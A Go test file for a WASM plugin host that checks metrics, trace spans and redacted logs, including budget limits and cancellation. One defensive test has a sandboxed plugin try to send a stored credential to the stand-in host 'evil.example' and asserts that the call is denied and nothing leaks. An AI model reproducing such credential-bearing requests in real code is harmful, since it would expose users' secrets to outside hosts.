package wasm

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"fairy/plugin"
	"fairy/runtime/observability"
)

func TestHandleRecordsCorrelationSpanMetricsAndRedactedLogs(t *testing.T) {
	spans := observability.NewMessageMetrics()
	t.Cleanup(spans.Close)
	metrics := observability.NewPluginMetrics()
	logs := observability.NewLogStore(32)
	host, err := OpenWith(t.Context(), Observer{Spans: spans, Metrics: metrics, Logs: logs})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = host.Close(t.Context()) })
	instance, err := host.Load(t.Context(), "echo-1", echoGuestWASM(), DefaultBudget())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = instance.Close(t.Context()) })

	traceID := spans.Begin("direct", "conversation")
	spans.TurnStarted(traceID, "conversation", "turn")
	envelope, err := plugin.EncodeEnvelope(plugin.Envelope{
		ABIVersion: plugin.ABIVersion,
		Kind:       "handle",
		Correlation: plugin.Correlation{
			PluginInstanceID: "echo-1", TraceID: traceID, TurnID: "turn", ExternalMessageID: "ext-1",
		},
		Payload: []byte(`{"ok":true}`),
	})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := instance.Handle(t.Context(), envelope); err != nil {
		t.Fatal(err)
	}
	spans.End(traceID, "completed")

	detail := waitForPluginSpan(t, spans, traceID)
	if detail.Attributes["pluginId"] != "echo-1" || detail.Attributes["capability"] != "handle" || detail.Category != "plugin" {
		t.Fatalf("plugin span = %#v", detail)
	}
	if _, leaked := detail.Attributes["payload"]; leaked {
		t.Fatalf("span leaked payload: %#v", detail.Attributes)
	}
	snapshot := host.SnapshotMetrics()
	if snapshot.Calls == 0 || snapshot.InFlight != 0 || len(snapshot.Instances) != 1 || snapshot.Instances[0].LastTraceID != traceID {
		t.Fatalf("metrics = %#v", snapshot)
	}
	entries := logs.Query(observability.LogFilter{PluginInstanceID: "echo-1"}).Entries
	if len(entries) == 0 || entries[0].Logger != "plugin.echo-1" {
		t.Fatalf("logs = %#v", entries)
	}
	encoded, err := json.Marshal(entries)
	if err != nil {
		t.Fatal(err)
	}
	for _, secret := range []string{"Bearer ", "sk-live", `"ok":true`} {
		if bytes.Contains(encoded, []byte(secret)) {
			t.Fatalf("log leaked %q: %s", secret, encoded)
		}
	}
}

func TestHostDenialRecordsMetricsWithoutLeakingSecret(t *testing.T) {
	metrics := observability.NewPluginMetrics()
	logs := observability.NewLogStore(32)
	host, err := OpenWith(t.Context(), Observer{Metrics: metrics, Logs: logs})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = host.Close(t.Context()) })
	server := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
	t.Cleanup(server.Close)
	grant := Grant{HTTPRequest: mustHTTPGrant(t, server.URL, 64)}
	if err := grant.HTTPRequest.SetCredential("search", pluginSecret); err != nil {
		t.Fatal(err)
	}
	instance, err := host.LoadGranted(t.Context(), "proxy", hostProxyGuestWASM(), DefaultBudget(), grant)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = instance.Close(t.Context()) })
	raw, err := json.Marshal(hostRequest{Capability: "http.request", Payload: json.RawMessage(`{"method":"GET","url":"https://evil.example/v1","credential":"search"}`)})
	if err != nil {
		t.Fatal(err)
	}
	out, err := instance.Handle(t.Context(), raw)
	if err != nil {
		t.Fatal(err)
	}
	snapshot := host.SnapshotMetrics()
	if snapshot.CapabilityDenied == 0 || snapshot.HostCalls == 0 {
		t.Fatalf("denied metrics = %#v", snapshot)
	}
	entries := logs.Query(observability.LogFilter{PluginInstanceID: "proxy"}).Entries
	if len(entries) == 0 {
		t.Fatal("denied call produced no logs")
	}
	text := strings.ToLower(string(out) + string(mustJSON(t, entries)) + string(mustJSON(t, snapshot)))
	for _, secret := range []string{strings.ToLower(pluginSecret), "bearer " + strings.ToLower(pluginSecret)} {
		if strings.Contains(text, secret) {
			t.Fatalf("observability leaked %q: %s", secret, text)
		}
	}
}

func TestBudgetExhaustionAndTrapAreObservable(t *testing.T) {
	metrics := observability.NewPluginMetrics()
	host, err := OpenWith(t.Context(), Observer{Metrics: metrics})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = host.Close(t.Context()) })
	budget := DefaultBudget()
	budget.MaxInputBytes = 8
	instance, err := host.Load(t.Context(), "echo-in", echoGuestWASM(), budget)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = instance.Close(t.Context()) })
	_, err = instance.Handle(t.Context(), bytes.Repeat([]byte("n"), 9))
	if !errors.Is(err, plugin.ErrBudgetExceeded) {
		t.Fatalf("Handle() = %v", err)
	}
	if host.SnapshotMetrics().BudgetExceeded == 0 {
		t.Fatalf("budget metrics = %#v", host.SnapshotMetrics())
	}

	spin, err := host.Load(t.Context(), "spin", spinGuestWASM(), DefaultBudget())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = spin.Close(t.Context()) })
	ctx, cancel := context.WithTimeout(t.Context(), 200*time.Millisecond)
	defer cancel()
	_, err = spin.Handle(ctx, []byte("x"))
	if !errors.Is(err, plugin.ErrCancelled) {
		t.Fatalf("spin Handle() = %v", err)
	}
	snapshot := host.SnapshotMetrics()
	if snapshot.Cancelled == 0 || snapshot.Restarts == 0 {
		t.Fatalf("trap/restart metrics = %#v", snapshot)
	}
}

func TestQueueWaitersAreVisibleWhileCallIsBlocked(t *testing.T) {
	metrics := observability.NewPluginMetrics()
	host, err := OpenWith(t.Context(), Observer{Metrics: metrics})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = host.Close(t.Context()) })
	instance, err := host.Load(t.Context(), "spin", spinGuestWASM(), DefaultBudget())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = instance.Close(t.Context()) })
	ctx, cancel := context.WithCancel(t.Context())
	defer cancel()
	blockedCtx, blockedCancel := context.WithTimeout(t.Context(), time.Second)
	defer blockedCancel()
	started := make(chan struct{})
	go func() {
		close(started)
		_, _ = instance.Handle(ctx, []byte("x"))
	}()
	<-started
	blocked := make(chan struct{})
	go func() {
		close(blocked)
		_, _ = instance.Handle(blockedCtx, []byte("y"))
	}()
	<-blocked
	deadline := time.Now().Add(time.Second)
	for time.Now().Before(deadline) {
		if host.SnapshotMetrics().QueueWaiters >= 1 {
			cancel()
			blockedCancel()
			return
		}
		time.Sleep(time.Millisecond)
	}
	t.Fatalf("queue waiters never became visible: %#v", host.SnapshotMetrics())
}

func waitForPluginSpan(t *testing.T, metrics *observability.MessageMetrics, traceID string) observability.TraceSpan {
	t.Helper()
	deadline := time.Now().Add(time.Second)
	for time.Now().Before(deadline) {
		detail, ok := metrics.Trace(traceID)
		if ok {
			for _, span := range detail.Spans {
				if span.Category == "plugin" && span.Status != "running" {
					return span
				}
			}
		}
		time.Sleep(time.Millisecond)
	}
	detail, _ := metrics.Trace(traceID)
	t.Fatalf("plugin span missing: %#v", detail)
	return observability.TraceSpan{}
}

func mustJSON(t *testing.T, value any) []byte {
	t.Helper()
	raw, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}
